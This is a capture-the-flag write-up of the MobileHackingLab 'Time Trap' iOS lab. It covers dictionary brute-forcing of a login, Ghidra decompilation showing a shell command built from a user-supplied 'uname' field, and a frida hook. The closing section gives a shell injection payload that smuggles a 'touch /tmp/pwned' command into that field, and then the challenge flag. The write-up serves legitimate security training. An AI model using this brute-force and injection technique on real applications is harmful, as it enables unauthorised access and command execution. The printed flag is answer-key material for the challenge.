Title: MobileHackingLab - Time Trap
Slug: mobile/mobilehackinglab/time-trap
Date: 2025-10-26 18:00
Category: Mobile

This is an iOS mobile challenge from [MobileHackingLabs](https://www.mobilehackinglab.com/course/lab-time-trap)
Time Trap is a fictional application that showcases insecure practices commonly found in internal applications.

**Objective**: Your objective is to get access to another users account and trigger the command injection vulnerability to run commands on the device.

The app presents itself as follows:

![[time-trap-app-1.jpg]]

## Password Bruteforcing

In the challenge tips, the username `emp002` is provided, stating that this user is known for use weak passwords; first-step has been to brute-force this user password

When trying logging in, the following HTTP request is sent:

![[time-trap-req-1.png]]

Password has been brute-forced using `Burp`'s intruder, performing a dictionary-based brute-force attack as follows:

![[time-trap-req-2.png]]

Found password is: `firefly`.

![[time-trap-req-3.png]]

Having the password, it's possible to login into the application:

![[time-trap-app-2.jpg]]

Following the successful login HTTP request:

![[time-trap-req-4.png]]


This is the home screen of the application after the login:

![[time-trap-app-3.jpg]]

## Dynamic & Static Analysis

After tapping on "Check In", a time starts as follows:

![[time-trap-app-4.jpg]]

Two request HTTP are sent:

1. `GET /time-trap/attendance-list` which retrieves a list of all past check-in and check-out
2. `POST /time-trap/attendance` which seems to be saving on the backend the check-in and the check-out. The parameter `uname` it's really interesting.

![[time-trap-req-5.png]]


![[time-trap-req-6.png]]

To better understand what's going on underneath, I've run `frida-trace` as follows, tracing all `Time_Trap` methods:

~~~
frida-trace -U -N com.mobilehackinglab.TimeTrap3.36V2J65722 -m '*[Time_Trap* *]'
~~~


![[time-trap-frida-1.png]]

This revealed that class `Time_Trap.AttendanceController` is the responsible for the previous HTTP requests. This class has been decompiled with `Ghidra`:

~~~c

/* WARNING: Removing unreachable block (ram,0x00010000ea08) */
/* WARNING: Removing unreachable block (ram,0x00010000ec0c) */
/* WARNING: Removing unreachable block (ram,0x00010000f10c) */
/* Time_Trap.AttendanceController.buttonPressed(__C.UIButton) -> () */

void __thiscall
Time_Trap::AttendanceController::buttonPressed(AttendanceController *this,UIButton *param_1)

{
  <REDACTED FOR BREVITY>
  
  local_1f8 = (ulong *)PTR__swift_isaMask_1000286b8;
  local_268.unknown = "Fatal error";
  local_260 = "Unexpectedly found nil while unwrapping an Optional value";
  local_258 = "Time_Trap/AttendanceController.swift";
  local_250 = "Swift/arm64-apple-ios.swiftinterface";
  local_248 = "Unexpectedly found nil while implicitly unwrapping an Optional value";
  local_240 = PTR_$$type_metadata_for_Any_100028790 + 8;
  local_38 = (UIButton *)0x0;
  local_40 = (AttendanceController *)0x0;
  local_50 = (UIButton *)0x0;
  local_48 = 0;
  local_58 = (UIButton *)0x0;
  local_80 = (UIButton *)0x0;
  local_204 = 0;
  local_270 = this;
  local_200 = param_1;
  _memset(&local_118,0,0x48);
  puVar9 = &$$demangling_cache_variable_for_type_metadata_for_Foundation.Date?;
  ___swift_instantiateConcreteTypeFromMangledName();
  local_238 = *(long *)(*(long *)(puVar9 + -8) + 0x40) + 0xfU & 0xfffffffffffffff0;
  pUVar6 = local_200;
  (*(code *)PTR____chkstk_darwin_100028208)();
  lVar1 = (long)&local_6e0 - local_238;
  local_228 = extraout_x8 + 0xfU & 0xfffffffffffffff0;
  local_230 = lVar1;
  (*(code *)PTR____chkstk_darwin_100028208)();
  lVar1 = lVar1 - local_228;
  local_218 = extraout_x8_00 + 0xfU & 0xfffffffffffffff0;
  local_220 = lVar1;
  (*(code *)PTR____chkstk_darwin_100028208)();
  lVar1 = lVar1 - local_218;
  local_210 = lVar1;
  local_40 = this;
  local_38 = pUVar6;
  _objc_retain();
  uVar14 = 0x2332b;
  _objc_msgSend(local_200,"setEnabled:",local_204 & 1);
  pUVar6 = local_200;
  _objc_release();
  (**(code **)((*(ulong *)this & *local_1f8) + 0xd0))();
  local_1f0 = pUVar6;
  local_1e4 = uVar14;
  if ((uVar14 & 0xff) != 0xff) {
    local_48 = (byte)uVar14 & 1;
    local_28c = uVar14;
    local_288 = pUVar6;
    local_280 = pUVar6;
    local_274 = uVar14;
    local_50 = pUVar6;
    if ((uVar14 & 1) == 0) {
      local_318 = pUVar6;
      local_298 = pUVar6;
      _swift_bridgeObjectRetain();
      local_80 = local_318;
      _swift_bridgeObjectRetain();
      local_308 = &local_d0;
      local_d0 = local_318;
      puVar9 = &$$demangling_cache_variable_for_type_metadata_for_[Time_Trap.AttendanceDetails];
      ___swift_instantiateConcreteTypeFromMangledName();
      local_310 = puVar9;
      Swift::Array<>::$lazy_protocol_witness_table_accessor();
      (extension_Swift)::Swift::Collection::$get_first();
      pAVar2 = local_270;
      $$outlined_destroy_of_[Time_Trap.AttendanceDetails](local_308);
      local_300 = local_c8;
      local_2f8 = local_c0;
      local_2f0 = local_b8;
      local_2e8 = local_b0;
      local_2e0 = local_a8;
      local_2d8 = local_a0;
      local_2d0 = local_98;
      local_2c8 = local_90;
      local_2c0 = local_88;
      local_118 = local_c8;
      local_110 = local_c0;
      local_108 = local_b8;
      local_100 = local_b0;
      local_f8 = local_a8;
      local_f0 = local_a0;
      local_e8 = local_98;
      local_e0 = local_90;
      local_d8 = local_88;
      local_2b8 = 0;
      local_128 = (char *)0x0;
      local_120 = (void *)0x0;
      (**(code **)((*(ulong *)pAVar2 & *local_1f8) + 0xa0))(local_210);
      $$outlined_init_with_copy_of_Foundation.Date?(local_210,local_220);
      local_2b0 = (undefined *)Foundation::Date::typeMetadataAccessor();
      local_2a8 = *(long *)(local_2b0 + -8);
      lVar7 = local_220;
      (**(code **)(local_2a8 + 0x30))(local_220,1);
      bVar5 = (int)lVar7 == 1;
      if (!bVar5) {
        $$outlined_destroy_of_Foundation.Date?(local_220);
      }
      local_31c = (uint)bVar5;
      local_320 = local_31c;
      $$outlined_destroy_of_Foundation.Date?(local_210);
      pAVar2 = local_270;
      if ((local_320 & 1) == 0) {
        uVar15 = 1;
        local_138 = (undefined *)Swift::DefaultStringInterpolation::init(0x2d,1);
        DVar17.unknown = (undefined *)0x1;
        local_130 = uVar15;
        SVar19 = Swift::String::init("if [[ $(uname -a) != \"",0x16,1);
        local_478 = SVar19.bridgeObject;
        Swift::DefaultStringInterpolation::appendLiteral(SVar19,DVar17);
        _swift_bridgeObjectRelease(local_478);
        *(undefined8 *)(lVar1 + -0x10) = local_2c0;
        $outlined_copy();
        if (local_2e0 == (void *)0x0) {
          local_4a8 = (char *)0x0;
          local_4a0 = (void *)0x0;
        }
        else {
          local_498 = local_2e8;
          local_490 = local_2e0;
          local_488 = local_2d0;
          local_480 = local_2c0;
          local_4c0 = local_2c0;
          local_4c8 = local_2d0;
          local_4b0 = local_2e0;
          local_4b8 = local_2e8;
          _swift_bridgeObjectRetain();
          _swift_bridgeObjectRelease(local_4b0);
          _swift_bridgeObjectRelease(local_4c8);
          _swift_bridgeObjectRelease(local_4c0);
          local_4a8 = local_4b8;
          local_4a0 = local_4b0;
        }
        local_4d0 = local_4a0;
        local_4d8 = local_4a8;
        _swift_bridgeObjectRetain();
        local_158 = local_4d8;
        local_150 = local_4d0;
        if (local_4d0 == (void *)0x0) {
          local_148 = Swift::String::init("",0,1);
        }
        else {
          local_148.bridgeObject = local_4d0;
          local_148.str = local_4d8;
        }
        _swift_bridgeObjectRelease(local_4d0);
        local_518 = &local_168;
        local_168 = local_148.str;
        local_160 = local_148.bridgeObject;
        local_508 = &local_138;
        Swift::DefaultStringInterpolation::$appendInterpolation
                  (local_518,PTR_$$type_metadata_for_Swift.String_100028460,
                   PTR_$$protocol_witness_table_for_Swift.String_:_Swift.CustomStringConvertible_in_ Swift_1000286a8
                   ,
                   PTR_$$protocol_witness_table_for_Swift.String_:_Swift.TextOutputStreamable_in_Swi ft_1000287d0
                  );
        $$outlined_destroy_of_Swift.String(local_518);
        DVar17.unknown = (undefined *)0x1;
        SVar19 = Swift::String::init("\" ]]; then uname -a; fi",0x17,1);
        local_510 = SVar19.bridgeObject;
        Swift::DefaultStringInterpolation::appendLiteral(SVar19,DVar17);
        _swift_bridgeObjectRelease(local_510);
        local_4f8.unknown = local_138;
        local_500 = local_130;
        _swift_bridgeObjectRetain();
        $$outlined_destroy_of_Swift.DefaultStringInterpolation(local_508);
        SVar19 = Swift::String::init(local_4f8);
        local_4f0 = SVar19.bridgeObject;
        CVar8 = Swift::String::get_utf8CString(SVar19);
        _$sSaySayxGqd__c7ElementQyd__RszSTRd__lufCs4Int8V_s15ContiguousArrayVyAEGTgmq5();
        local_4e8 = CVar8.unknown;
        Swift::Array<undefined>::$get__baseAddressIfContiguous();
        local_4e0 = CVar8.unknown;
        if ((CVar8.unknown != (undefined *)0x0) ||
           (bVar5 = (extension_Swift)::Swift::Collection::get_isEmpty(), bVar5)) {
          puVar9 = local_4e8;
          Swift::Array<undefined>::$get__owner();
          local_538 = puVar9;
          local_520 = puVar9;
          if (local_4e0 == (undefined *)0x0) {
            local_530 = (undefined *)0x0;
          }
          else {
            local_528 = local_4e0;
            local_530 = local_4e0;
          }
        }
        else {
          _swift_bridgeObjectRetain(local_4e8);
          puVar9 = local_4e8;
          _$ss15ContiguousArrayVyAByxGqd__c7ElementQyd__RszSTRd__lufCs4Int8V_s01_B6BufferVyAGGTgmq5
                    ();
          local_588.unknown = puVar9;
          _swift_retain();
          _swift_release(local_588.unknown);
          _Var10.unknown = local_588.unknown;
          Swift::_ContiguousArrayBuffer::$get_owner(local_588);
          local_580 = _Var10.unknown;
          local_578 = (undefined *)Swift::_ContiguousArrayBuffer::get_firstElementAddress(local_588)
          ;
          _swift_release(local_588.unknown);
          local_530 = local_578;
          local_538 = local_580;
        }
        local_548 = local_530;
        local_540 = local_538;
        if (local_530 == (undefined *)0x0) {
          local_178 = 0xffffffffffffffff;
          local_558 = 0xffffffffffffffff;
          local_560 = 0xffffffffffffffff;
          local_170 = (undefined *)0xffffffffffffffff;
          _swift_bridgeObjectRelease(local_4e8);
        }
        else {
          local_550 = local_530;
          local_170 = local_530;
          _swift_bridgeObjectRelease(local_4e8);
        }
        puVar9 = local_170;
        _executeCommand();
        _objc_retainAutoreleasedReturnValue();
        local_568 = puVar9;
        _swift_unknownObjectRelease(local_540);
        _swift_bridgeObjectRelease(local_4f0);
        if (local_568 == (undefined *)0x0) {
          local_598 = (char *)0x0;
          local_590 = (void *)0x0;
        }
        else {
          local_570 = local_568;
          local_5b0 = local_568;
          local_5a8 = (extension_Foundation)::Swift::String::$_unconditionallyBridgeFromObjectiveC()
          ;
          _objc_release(local_5b0);
          local_598 = local_5a8.str;
          local_590 = local_5a8.bridgeObject;
        }
        local_5b8 = local_590;
        local_5c0 = local_598;
        _swift_bridgeObjectRetain();
        pvVar11 = local_120;
        local_128 = local_5c0;
        local_120 = local_5b8;
        _swift_bridgeObjectRelease(pvVar11);
        pcVar13 = local_260;
        SVar3.unknown = local_268.unknown;
        pAVar2 = local_270;
        if (local_5b8 == (void *)0x0) {
          *(undefined1 *)(lVar1 + -0x20) = 2;
          *(undefined8 *)(lVar1 + -0x18) = 0x5e;
          *(undefined4 *)(lVar1 + -0x10) = 0;
          Swift::_assertionFailure(SVar3,(StaticString)0xb,(StaticString)0x2,(__uint64)pcVar13,0x39)
          ;
                    /* WARNING: Does not return */
          pcVar4 = (code *)SoftwareBreakpoint(1,0x10000f2b0);
          (*pcVar4)();
        }
        local_5d0 = local_5c0;
        local_5c8 = local_5b8;
        uname.bridgeObject = local_5b8;
        uname.str = local_5c0;
        local_5d8 = local_5b8;
        updateAttendance(uname);
        pvVar11 = local_5d8;
        _swift_bridgeObjectRelease();
        (**(code **)((*(ulong *)pAVar2 & *local_1f8) + 0xb8))();
        local_180 = pvVar11;
        if (pvVar11 == (void *)0x0) {
          $$outlined_destroy_of___C.NSTimer?(&local_180);
        }
        else {
          local_5e8 = &local_180;
          local_5e0 = pvVar11;
          _objc_retain();
          $$outlined_destroy_of___C.NSTimer?(local_5e8);
          _objc_msgSend(local_5e0,"invalidate");
          _objc_release(local_5e0);
        }
        local_5f8 = 0;
        (**(code **)((*(ulong *)local_270 & *local_1f8) + 0xc0))();
        pAVar2 = local_270;
        (**(code **)(local_2a8 + 0x38))(local_230,1,1,local_2b0);
        (**(code **)((*(ulong *)pAVar2 & *local_1f8) + 0xa8))(local_230);
        (**(code **)((*(ulong *)local_270 & *local_1f8) + 0x130))();
        SVar19 = Swift::String::init("Check In",8,1);
        local_600 = SVar19.bridgeObject;
        local_5f0 = (extension_Foundation)::Swift::String::_bridgeToObjectiveC();
        _swift_bridgeObjectRelease(local_600);
        _objc_msgSend(local_200,"setTitle:forState:",local_5f0,local_5f8);
        pNVar12 = local_5f0;
        _objc_release();
      }
      else {
        Foundation::Date::init();
        (**(code **)(local_2a8 + 0x38))(local_230,0,1,local_2b0);
        (**(code **)((*(ulong *)pAVar2 & *local_1f8) + 0xa8))(local_230);
        SVar19 = Swift::String::init("uname -a",8,1);
        local_338 = SVar19.bridgeObject;
        CVar8 = Swift::String::get_utf8CString(SVar19);
        _$sSaySayxGqd__c7ElementQyd__RszSTRd__lufCs4Int8V_s15ContiguousArrayVyAEGTgmq5();
        local_330 = CVar8.unknown;
        Swift::Array<undefined>::$get__baseAddressIfContiguous();
        local_328 = CVar8.unknown;
        if ((CVar8.unknown != (undefined *)0x0) ||
           (bVar5 = (extension_Swift)::Swift::Collection::get_isEmpty(), bVar5)) {
          puVar9 = local_330;
          Swift::Array<undefined>::$get__owner();
          local_358 = puVar9;
          local_340 = puVar9;
          if (local_328 == (undefined *)0x0) {
            local_350 = (undefined *)0x0;
          }
          else {
            local_348 = local_328;
            local_350 = local_328;
          }
        }
        else {
          _swift_bridgeObjectRetain(local_330);
          puVar9 = local_330;
          _$ss15ContiguousArrayVyAByxGqd__c7ElementQyd__RszSTRd__lufCs4Int8V_s01_B6BufferVyAGGTgmq5
                    ();
          local_3a8.unknown = puVar9;
          _swift_retain();
          _swift_release(local_3a8.unknown);
          _Var10.unknown = local_3a8.unknown;
          Swift::_ContiguousArrayBuffer::$get_owner(local_3a8);
          local_3a0 = _Var10.unknown;
          local_398 = (undefined *)Swift::_ContiguousArrayBuffer::get_firstElementAddress(local_3a8)
          ;
          _swift_release(local_3a8.unknown);
          local_350 = local_398;
          local_358 = local_3a0;
        }
        local_368 = local_350;
        local_360 = local_358;
        if (local_350 == (undefined *)0x0) {
          local_1c0 = 0xffffffffffffffff;
          local_378 = 0xffffffffffffffff;
          local_380 = 0xffffffffffffffff;
          local_1b8 = (undefined *)0xffffffffffffffff;
          _swift_bridgeObjectRelease(local_330);
        }
        else {
          local_370 = local_350;
          local_1b8 = local_350;
          _swift_bridgeObjectRelease(local_330);
        }
        puVar9 = local_1b8;
        _executeCommand();
        _objc_retainAutoreleasedReturnValue();
        local_388 = puVar9;
        _swift_unknownObjectRelease(local_360);
        _swift_bridgeObjectRelease(local_338);
        if (local_388 == (undefined *)0x0) {
          local_3b8 = (char *)0x0;
          local_3b0 = (void *)0x0;
        }
        else {
          local_390 = local_388;
          local_3d0 = local_388;
          local_3c8 = (extension_Foundation)::Swift::String::$_unconditionallyBridgeFromObjectiveC()
          ;
          _objc_release(local_3d0);
          local_3b8 = local_3c8.str;
          local_3b0 = local_3c8.bridgeObject;
        }
        local_3d8 = local_3b0;
        local_3e0 = local_3b8;
        _swift_bridgeObjectRetain();
        pvVar11 = local_120;
        local_128 = local_3e0;
        local_120 = local_3d8;
        _swift_bridgeObjectRelease(pvVar11);
        pcVar13 = local_260;
        SVar3.unknown = local_268.unknown;
        if (local_3d8 == (void *)0x0) {
          *(undefined1 *)(lVar1 + -0x20) = 2;
          *(undefined8 *)(lVar1 + -0x18) = 0x59;
          *(undefined4 *)(lVar1 + -0x10) = 0;
          Swift::_assertionFailure(SVar3,(StaticString)0xb,(StaticString)0x2,(__uint64)pcVar13,0x39)
          ;
                    /* WARNING: Does not return */
          pcVar4 = (code *)SoftwareBreakpoint(1,0x10000ebac);
          (*pcVar4)();
        }
        local_3f0 = local_3e0;
        local_3e8 = local_3d8;
        uname_00.bridgeObject = local_3d8;
        uname_00.str = local_3e0;
        local_408 = local_3d8;
        updateAttendance(uname_00);
        _swift_bridgeObjectRelease(local_408);
        puVar9 = &_OBJC_CLASS_$_NSTimer;
        _objc_opt_self();
        local_400 = puVar9;
        _objc_retain(local_270);
        pAVar2 = local_270;
        local_1c8 = 0;
        local_1d0 = 0;
        local_1d8 = 0;
        local_1e0 = 0;
        local_3f8 = "updateTime";
        local_410 = 0;
        local_470 = 0;
        local_45c = 1;
        puVar9 = local_400;
        _objc_msgSend(0x3ff0000000000000,local_400,
                      "scheduledTimerWithTimeInterval:target:selector:userInfo:repeats:",local_270,
                      "updateTime",0,1);
        _objc_retainAutoreleasedReturnValue();
        local_468 = puVar9;
        _swift_unknownObjectRelease(local_470);
        _swift_unknownObjectRelease(pAVar2);
        (**(code **)((*(ulong *)pAVar2 & *local_1f8) + 0xc0))(local_468);
        SVar19 = Swift::String::init("Check Out",9,(byte)local_45c & 1);
        local_458 = SVar19.bridgeObject;
        local_450 = (extension_Foundation)::Swift::String::_bridgeToObjectiveC();
        _swift_bridgeObjectRelease(local_458);
        _objc_msgSend(local_200,"setTitle:forState:",local_450,0);
        pNVar12 = local_450;
        _objc_release();
      }
      (**(code **)((*(ulong *)local_270 & *local_1f8) + 0xe8))();
      pcVar13 = local_248;
      SVar3.unknown = local_268.unknown;
      local_608 = pNVar12;
      if (pNVar12 == (NSString *)0x0) {
        *(undefined1 *)(lVar1 + -0x20) = 2;
        *(undefined8 *)(lVar1 + -0x18) = 0x67;
        *(undefined4 *)(lVar1 + -0x10) = 0;
        Swift::_assertionFailure(SVar3,(StaticString)0xb,(StaticString)0x2,(__uint64)pcVar13,0x44);
                    /* WARNING: Does not return */
        pcVar4 = (code *)SoftwareBreakpoint(1,0x10000f4b8);
        (*pcVar4)();
      }
      local_620 = local_128;
      local_618 = local_120;
      local_628 = pNVar12;
      local_610 = pNVar12;
      _swift_bridgeObjectRetain();
      _swift_bridgeObjectRetain(local_618);
      *(undefined8 *)(lVar1 + -0x10) = local_2c0;
      $outlined_copy();
      local_1a0 = local_620;
      pvStack_198 = local_618;
      if (local_618 == (void *)0x0) {
        *(undefined8 *)(lVar1 + -0x10) = local_2c0;
        $outlined_copy();
        if (local_2e0 == (void *)0x0) {
          local_658 = (char *)0x0;
          local_650 = (void *)0x0;
        }
        else {
          local_648 = local_2e8;
          local_640 = local_2e0;
          local_638 = local_2d0;
          local_630 = local_2c0;
          local_670 = local_2c0;
          local_678 = local_2d0;
          local_660 = local_2e0;
          local_668 = local_2e8;
          _swift_bridgeObjectRetain();
          _swift_bridgeObjectRelease(local_660);
          _swift_bridgeObjectRelease(local_678);
          _swift_bridgeObjectRelease(local_670);
          local_658 = local_668;
          local_650 = local_660;
        }
        local_680 = local_650;
        local_688 = local_658;
        _swift_bridgeObjectRetain();
        local_1b0 = local_688;
        local_1a8 = local_680;
        if (local_680 == (void *)0x0) {
          local_190 = Swift::String::init("Unable to find device information.",0x22,1);
        }
        else {
          local_190.bridgeObject = local_680;
          local_190.str = local_688;
        }
        _swift_bridgeObjectRelease(local_680);
      }
      else {
        local_190.bridgeObject = local_618;
        local_190.str = local_620;
      }
      *(undefined8 *)(lVar1 + -0x10) = local_2c0;
      $outlined_consume();
      _swift_bridgeObjectRelease(local_618);
      local_698 = local_190.bridgeObject;
      local_690 = (extension_Foundation)::Swift::String::_bridgeToObjectiveC();
      _swift_bridgeObjectRelease(local_698);
      _objc_msgSend(local_628,"setText:",local_690);
      _objc_release(local_690);
      _objc_release(local_628);
      $$outlined_destroy_of_Swift.String?(&local_128);
      *(undefined8 *)(lVar1 + -0x10) = local_2c0;
      $outlined_consume();
      _swift_bridgeObjectRelease(local_318);
    }
    else {
      local_6a0 = pUVar6;
      local_2a0 = pUVar6;
      _swift_errorRetain();
      local_58 = local_6a0;
      _objc_retain(local_200);
      _objc_msgSend(local_200,"setEnabled:",0);
      _objc_release(local_200);
      tVar20 = Swift::$_allocateUninitializedArray(1);
      local_6e0 = tVar20.1;
      local_6c8 = tVar20._0_8_;
      _swift_getErrorValue(local_6a0,auStack_60,&local_78);
      local_6d8 = local_78;
      local_6d0 = local_70;
      *(char **)((long)local_6e0 + 0x18) = local_70;
      ___swift_allocate_boxed_opaque_existential_0();
      pcVar18 = local_6d0;
      (**(code **)(*(long *)(local_6d0 + -8) + 0x10))();
      pcVar13 = local_6c8;
      pcVar16 = local_240;
      Swift::$_finalizeUninitializedArray();
      SVar19.bridgeObject = pcVar16;
      SVar19.str = pcVar13;
      separator.bridgeObject = in_x3;
      separator.str = pcVar18;
      local_6a8 = pcVar13;
      Swift::$print(SVar19,separator);
      SVar21.bridgeObject = pcVar16;
      SVar21.str = pcVar13;
      separator_00.bridgeObject = in_x3;
      separator_00.str = pcVar18;
      local_6c0 = pcVar13;
      local_6b0 = pcVar16;
      Swift::$print(SVar21,separator_00);
      SVar22.bridgeObject = local_6c0;
      SVar22.str = local_6a8;
      separator_01.bridgeObject = pcVar13;
      separator_01.str = local_6b0;
      local_6b8 = pcVar16;
      Swift::$print(SVar22,separator_01);
      _swift_bridgeObjectRelease(local_6b8);
      _swift_bridgeObjectRelease(local_6b0);
      _swift_bridgeObjectRelease(local_6a8);
      _swift_errorRelease(local_6a0);
    }
    $outlined_consume();
  }
  (**(code **)((*(ulong *)local_270 & *local_1f8) + 0x138))();
  _objc_retain(local_200);
  _objc_msgSend(local_200,"setEnabled:",1);
  _objc_release(local_200);
  return;
}
~~~

This controller seems to be constructing a shell command and passing it to a method named `_executeCommand()`; this command is used to retrieve current device kernel and OS information.


![[time-trap-static-1.png]]


![[time-trap-static-2.png]]

Based on the decompiled code, the constructed command would be the following:

~~~shell
if [[ $(uname -a) != "<USER PROVIDED INPUT>" ]]; then uname -a; fi
~~~

where `<USER PROVIDED INPUT>` is the value provided in the `uname` body parameter from the previous HTTP POST request.

Following the decompiled code for `_executeCommand()`:

~~~c
void _executeCommand(undefined8 param_1)

{
  int iVar1;
  pid_t pVar2;
  cfstringStruct *pcVar3;
  ssize_t sVar4;
  cfstringStruct *pcVar5;
  posix_spawn_file_actions_t pvStack_1070;
  cfstringStruct *local_1068;
  uint local_1060;
  pid_t local_105c;
  undefined8 local_1058;
  undefined1 auStack_1050 [4096];
  int local_50;
  int local_4c;
  char *local_48;
  char *local_40;
  undefined8 local_38;
  undefined8 local_30;
  long local_28;
  
  (*(code *)PTR____chkstk_darwin_100028208)();
  local_28 = *(long *)PTR____stack_chk_guard_100028250;
  local_48 = "sh";
  local_40 = "-c";
  local_30 = 0;
  pcVar3 = &cf_"";
  local_1058 = param_1;
  local_38 = param_1;
  _objc_retain();
  local_1068 = pcVar3;
  _pipe((int)&stack0xfffffffffffffff0 + -0x40);
  _posix_spawn_file_actions_init(&pvStack_1070);
  _posix_spawn_file_actions_addclose(&pvStack_1070,local_50);
  _posix_spawn_file_actions_adddup2(&pvStack_1070,local_4c,1);
  _posix_spawn_file_actions_addclose(&pvStack_1070,local_4c);
  iVar1 = _posix_spawn(&local_105c,"/bin/sh",&pvStack_1070,(posix_spawnattr_t *)0x0,&local_48,
                       (char **)0x0);
  if (iVar1 == 0) {
    _close(local_4c);
    while (sVar4 = _read(local_50,auStack_1050,0x1000), 0 < sVar4) {
      pcVar5 = (cfstringStruct *)&_OBJC_CLASS_$_NSString;
      _objc_alloc();
      _objc_msgSend$initWithBytes:length:encoding:();
      pcVar3 = local_1068;
      local_1068 = pcVar5;
      _objc_release(pcVar3);
      _NSLog(&cf_Output:%@);
    }
    _close(local_50);
    pVar2 = _waitpid(local_105c,(int *)&local_1060,0);
    if (pVar2 == -1) {
      _perror("waitpid");
    }
    else if ((local_1060 & 0x7f) == 0) {
      _NSLog(&cf_Commandexitedwithstatus%d);
    }
    else {
      _NSLog(&cf_Commandexitedabnormally);
    }
  }
  else {
    _perror("posix_spawn");
  }
  _posix_spawn_file_actions_destroy(&pvStack_1070);
  pcVar3 = local_1068;
  _objc_retain();
  _objc_storeStrong(&local_1068,0);
  if (*(long *)PTR____stack_chk_guard_100028250 == local_28) {
    _objc_autoreleaseReturnValue(pcVar3);
    return;
  }
                    /* WARNING: Subroutine does not return */
  ___stack_chk_fail();
}
~~~

This code simply invokes `posix_spawn` with the previously constructed command:

![[time-trap-static-3.png]]


To confirm the static analysis, I've decide to hook this method and dump it's arguments. From `Ghidra`, it seems that the method it's exported so it's trivial to hook it with a `frida` script

![[time-trap-static-4.png]]

Following the `frida` script:

~~~javascript
Interceptor.attach(Module.findExportByName("Time Trap", "executeCommand"), {
    onEnter: function (args) { 
        console.log("[>] Executing command...")
        console.log("[>] Arguments: " + Memory.readUtf8String(args[0]));
    },
    onLeave: function (retval) {
    }
});
~~~

![[time-trap-frida-2.png]]

After tapping "Check-In", I've intercepted the HTTP request with `Burp` and I've set the value `test` in the `uname` parameter as follows:

![[time-trap-req-7.png]]

After forwarding, the request, the `frida` script dumped the first `executeCommand()` parameter  value: `uname -a`.
However, when tapping on "Check Out", the dumped parameter value is the following: `if [[ $(uname -a) != "<USER PROVIDED INPUT>" ]]; then uname -a; fi`

![[time-trap-frida-3.png]]

This confirms what emerged from the static analysis: the application is vulnerable to Command Injection. 
In order to exploit this vulnerability, I've used the following payload in the `uname` parameter:

~~~bash
\" || 1 -eq 1 ]]; then touch /tmp/pwned; elif [[ $(uname -a) != \"
~~~

This will result in the following shell command being executed:

~~~bash
if [[ $(uname -a) != "" || 1 -eq 1 ]]; then touch /tmp/pwned; elif [[ $(uname -a) != "" ]]; then uname -a; fi
~~~

This is confirmed by the `frida` dump script:

![[time-trap-frida-4.png]]

On `Burp`, the "Check Out" request returns the flag: `MHL{9_t0_5_C0mm4ndz_Sl4v1ng_4w4y}`

![[time-trap-req-8.png]]

